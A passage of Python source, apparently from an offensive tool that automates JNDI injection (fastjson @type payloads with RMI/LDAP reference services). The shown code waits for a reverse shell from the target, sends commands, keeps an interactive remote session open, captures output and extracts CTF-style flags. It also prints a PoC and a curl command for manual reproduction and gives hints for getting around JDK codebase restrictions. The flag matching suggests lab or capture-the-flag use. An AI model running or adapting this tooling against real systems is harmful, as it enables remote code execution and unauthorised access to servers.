            note(f"[7/7] 等待反弹 shell 连接（≤{wait_time}s）...")
            connected = await self._wait_connection(client, lport, wait_time)
            if connected:
                note(f"      收到连接！下发命令: {command}")
                await self._send_command(client, workdir, command)
                await asyncio.sleep(5)
                shell_output = await self._read_output(client, workdir)
                if interactive and ctx.sessions is not None:
                    sh = _InteractiveShell(
                        client, workdir, pids, note,
                        ref_svc=("rmi" if is_rmi else "ldap"),
                    )
                    await sh.setup()
                    sess = ctx.sessions.create(sh.exec_command, sh.close)
                    session_id = sess.id
                    keep_session = True
                    note(f"      交互会话已建立: {session_id}（前端可继续下发命令，关闭会话时自动清理远程环境）")
            elif target_url:
                # 盲发前先确认监听器仍在监听；否则 >rev.fifo 无读者会阻塞到超时
                if await self._wait_listen(client, lport, timeout=10):
                    note("      未探测到连接（可能缺 ss/netstat），盲发命令验证 ...")
                    await self._send_command(client, workdir, command)
                    await asyncio.sleep(5)
                    shell_output = await self._read_output(client, workdir)
                    # rev.out 混有监听器自身日志（banner/拒绝记录），必须剔除
                    # 后再判断是否真的收到了命令输出，否则恒为“有输出”假阳性
                    real_out = "\n".join(
                        ln for ln in shell_output.splitlines()
                        if not re.match(
                            r"^(Listening on |Rejected connection|Accepted connection|Connection closed)",
                            ln,
                        )
                    ).strip()
                    connected = bool(real_out)
                else:
                    note("      监听器未在监听，跳过盲发（回连从未建立）")
            if not connected:
                note("      超时未收到连接（检查靶机 JDK 版本 / 出网策略 / 端口是否可达）")
                if is_rmi:
                    note(
                        "      RMI 提示: 目标 JDK 8u121+ 默认禁用 RMI 远程类加载"
                        "（com.sun.jndi.rmi.object.trustURLCodebase=false），"
                        "若 LDAP 可用优先换 LDAP；仅当确认目标允许 RMI codebase 时用本协议"
                    )
                if http_resp and "type not match" in str(http_resp.get("body", "")):
                    note(
                        "      响应含 type not match: 目标应用把根 JSON 绑定到了具体类，"
                        "根级 @type 注入无效，请换 fastjson_1.2.47 嵌套模板或 custom 自定义"
                    )
                ref_log = f"rmi.log" if is_rmi else "ldap.log"
                diag_code, diag_out, _ = await client.exec(
                    f"echo =={ref_log}==; tail -n 5 {workdir}/{ref_log} 2>/dev/null; "
                    f"echo ==http.log==; tail -n 5 {workdir}/http.log 2>/dev/null; "
                    f"echo ==rev.out==; cat {workdir}/rev.out 2>/dev/null",
                    timeout=30,
                )
                if diag_code == 0:
                    note(f"      服务日志诊断:\n{diag_out.strip()[:800]}")

            status = Status.SUCCESS if (connected or not target_url) else Status.ERROR
            if status is Status.ERROR:
                stderr = "未收到反弹 shell 连接，PoC 已生成（见输出中的 PoC 与 curl 命令）"
        except Exception as exc:  # noqa: BLE001
            status = Status.ERROR
            stderr = stderr or f"{type(exc).__name__}: {exc}"
        finally:
            if keep_session:
                note("[cleanup] 交互模式：保留反弹监听/工作目录供会话使用（HTTP/引用服务已回收）")
            elif cleanup:
                try:
                    # 公网 SSH 存在瞬断，kill 需重试；启动前已验证端口空闲，
                    # 若仍残留监听则按 ss -tlnp 精确补杀（只可能是本轮部署的进程）。
                    ports_pat = ":({http_port}|{ref_port}|{lport}) ".format(
                        http_port=http_port, ref_port=ref_port, lport=lport
                    )
                    for attempt in range(4):
                        kill_targets = " ".join(p for p in pids.values() if p)
                        if kill_targets:
                            await client.exec(f"kill {kill_targets} 2>/dev/null || true", timeout=20)
                        await asyncio.sleep(1)
                        code, out, _ = await client.exec(
                            f"ss -tlnp 2>/dev/null | grep -E '{ports_pat}' || true",
                            timeout=20,
                        )
                        if code != 0:
                            continue  # 检查本身因瞬断失败，重试而非误判“已干净”
                        leftovers = [ln for ln in out.splitlines() if ln.strip()]
                        if not leftovers:
                            break
                        # 从 ss 输出提取 pid=NNN 补杀
                        stray = re.findall(r"pid=(\d+)", out)
                        if not stray:
                            break
                        pids["stray"] = " ".join(stray)
                        note(f"[cleanup] 残留监听（第{attempt + 1}次），补杀: {', '.join(stray)}")
                    # fifo 保活的 sleep 与 python 监听器无监听 socket 时 ss 抓不到；
                    # 用正则字符类写模式串，避免 pkill -f 匹配到本命令自身
                    # （命令里是字面 'sleep 999[9]99'，正则不会命中自己）
                    await client.exec(
                        "pkill -f 'sleep 999[9]99' 2>/dev/null; "
                        "pkill -f 'reverse_listene[r]' 2>/dev/null || true",
                        timeout=20,
                    )
                    await client.exec(f"rm -rf {workdir}", timeout=20)
                    # 终验：如实报告清理结果
                    code, out, _ = await client.exec(
                        f"ss -tlnp 2>/dev/null | grep -E '{ports_pat}' || true",
                        timeout=20,
                    )
                    if code == 0 and not out.strip():
                        note("[cleanup] 已清理远程进程与工作目录")
                    else:
                        note(f"[cleanup] 清理完成但端口仍有残留:\n{out.strip()[:300]}")
                except Exception as exc:  # noqa: BLE001
                    note(f"[cleanup] 清理失败: {exc}")

        # 汇总输出
        flag = None
        if shell_output:
            match = re.search(r"flag\{[^}]+\}", shell_output)
            flag = match.group(0) if match else None

        lines = ["== JNDI 注入执行报告 ==", ""]
        lines += log
        if poc_raw:
            lines += [
                "",
                f"== PoC（{trigger}）==",
                json.dumps(poc, indent=2, ensure_ascii=False),
                "",
                "== 手动复现 ==",
                curl_cmd,
            ]
        if shell_output:
            lines += ["", "== 反弹 shell 输出 ==", shell_output.rstrip()]
            if flag:
                lines += ["", f"== FLAG: {flag} =="]
        if not cleanup or session_id:
            lines += [
                "",
                "== 环境保留 ==",
                f"远程工作目录: {workdir}",
                f"进程 PID: {json.dumps(pids, ensure_ascii=False)}",
            ]
            if session_id:
                lines += [f"交互会话 ID: {session_id}（/api/sessions/{session_id}/exec）"]

        data = {
            "poc": poc_raw,
            "curl_cmd": curl_cmd,
            "class_name": cls_name,
            "trigger": trigger,
            "jndi_protocol": jndi_protocol,
            "jndi_url": jndi_url,
            "codebase": codebase,
            "reverse_shell": f"socket {lhost}:{lport} ({shell})",
            "http_response": http_resp,
            "shell_output": shell_output,
            "connected": connected,
            "flag": flag,
            "session_id": session_id,
            "workdir": workdir if (session_id or not cleanup) else "",
        }
        return ToolResult(
            status=status, stdout="\n".join(lines), stderr=stderr, data=data
        )
